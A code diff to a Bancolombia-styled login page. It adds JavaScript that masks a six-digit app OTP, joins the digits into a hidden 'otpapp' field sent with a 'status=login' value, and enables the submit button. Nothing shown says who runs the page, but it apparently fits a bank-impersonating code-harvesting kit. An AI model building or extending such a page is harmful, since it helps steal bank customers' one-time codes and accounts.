@@ -239,22 +239,25 @@
 
                     <div class="w-full mt-4 flex flex-col items-center">
                         <div class="flex justify-center gap-2 w-full max-w-xs">
-                            <input id="otpapp-0" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-0" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpapp-1" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-1" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpapp-2" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-2" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpapp-3" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-3" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpapp-4" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-4" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="otpapp-5" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-otpapp-5" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                         </div>
                     </div>
-
-                    <button id="validarOtpApp"
+                    
+                    <input type="hidden" id="otpapp" name="otpapp" value="" />
+                    <input type="hidden" id="no-status" name="status" value="login" />
+                    
+                    <button id="enviar"
                         class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                         disabled>
                         Continuar
@@ -273,23 +276,120 @@
     </div>
 
     <script>
+        /* ===== UTILIDADES ===== */
+
+        /**
+         * Habilita o deshabilita un botón con estilos apropiados
+         */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
+            } else {
+                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
+                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
+            }
+        }
+
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
 
         /**
-         * Valida OTP App
+         * Valida OTP App y actualiza el campo hidden
          * Requisito: exactamente 6 dígitos numéricos
          */
         function validateOtpApp() {
             let codigo = '';
             for (let i = 0; i < 6; i++) {
-                const input = document.getElementById(`otpapp-${i}`);
+                const input = document.getElementById(`no-otpapp-${i}`);
                 if (input) {
                     codigo += (input.dataset.realValue || '');
                 }
             }
+
+            // Actualizar el campo hidden con los 6 dígitos
+            const otpappHidden = document.getElementById('otpapp');
+            if (otpappHidden) {
+                otpappHidden.value = codigo;
+            }
+
             const isValid = codigo.length === 6 && /^\d{6}$/.test(codigo);
+
+            // Habilitar/deshabilitar botón
+            const btnEnviar = document.getElementById('enviar');
+            toggleButton(btnEnviar, isValid);
+
             return isValid;
         }
+
+        /* ===== CONFIGURACIÓN DE INPUTS MULTI-DÍGITO ===== */
+
+        /**
+         * Configura inputs de múltiples dígitos con navegación automática
+         * @param {string} prefix - Prefijo del ID (ej: 'no-otpapp')
+         * @param {number} maxLength - Cantidad de inputs
+         */
+        function setupMultiDigitInputs(prefix, maxLength) {
+            for (let i = 0; i < maxLength; i++) {
+                const input = document.getElementById(`${prefix}-${i}`);
+                if (!input) continue;
+
+                // Si es un input de contraseña (con punto)
+                if (input.classList.contains('password-input')) {
+                    input.addEventListener('input', function (e) {
+                        const v = e.target.value;
+                        // Solo permitir un dígito
+                        if (!/^[0-9]?$/.test(v)) {
+                            e.target.value = '';
+                            e.target.dataset.realValue = '';
+                            return;
+                        }
+                        if (v) {
+                            // Guardar el valor real y mostrar un punto
+                            e.target.dataset.realValue = v;
+                            e.target.value = '•';
+                            // Mover al siguiente input si no es el último
+                            if (i < maxLength - 1) {
+                                const nextInput = document.getElementById(`${prefix}-${i + 1}`);
+                                if (nextInput) nextInput.focus();
+                            }
+                        } else {
+                            e.target.dataset.realValue = '';
+                        }
+                        // Validar después de cada entrada
+                        validateOtpApp();
+                    });
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === 'Backspace') {
+                            if (!this.dataset.realValue && i > 0) {
+                                // Si está vacío, ir al anterior y borrarlo
+                                const prevInput = document.getElementById(`${prefix}-${i - 1}`);
+                                if (prevInput) {
+                                    prevInput.focus();
+                                    prevInput.value = '';
+                                    prevInput.dataset.realValue = '';
+                                }
+                                validateOtpApp();
+                            } else if (this.dataset.realValue) {
+                                // Si tiene valor, borrarlo
+                                this.value = '';
+                                this.dataset.realValue = '';
+                                validateOtpApp();
+                            }
+                        }
+                    });
+                }
+            }
+        }
+
+        /* ===== INICIALIZACIÓN ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup de inputs multi-dígito para OTP App
+            setupMultiDigitInputs('no-otpapp', 6);
+        });
     </script>
 
     <x-control
